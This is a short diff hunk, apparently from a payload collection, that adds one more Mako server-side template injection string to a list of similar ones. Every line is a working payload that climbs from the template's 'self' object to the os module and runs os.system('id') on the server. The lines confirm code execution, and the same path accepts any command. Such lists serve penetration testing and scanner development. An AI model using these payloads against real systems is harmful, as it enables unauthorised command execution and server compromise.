@@ -53,3 +53,4 @@ ${self.module.cache.compat.inspect.os.system("id")}
 ${self.__init__.__globals__['util'].os.system('id')}
 ${self.template.module.runtime.util.os.system("id")}
 ${self.module.filters.compat.inspect.os.system("id")}
+${self.module.runtime.compat.inspect.os.system("id")}
